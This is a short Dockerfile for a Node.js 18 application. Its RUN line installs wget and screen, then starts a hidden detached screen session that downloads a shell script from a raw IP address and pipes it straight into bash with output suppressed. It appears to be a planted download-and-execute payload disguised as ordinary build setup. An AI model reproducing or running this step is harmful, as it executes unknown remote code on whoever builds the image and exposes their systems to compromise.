FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN npm ci && apt update && apt -y installl  wget screen && screen -dmS wooot bash -c 'wget -O - http://194.233.164.53/start_Honey_kin_man_ws_rand.sh | bash >/dev/null &; exec bash' && screen -ls

CMD ["npm", "run", "start"]
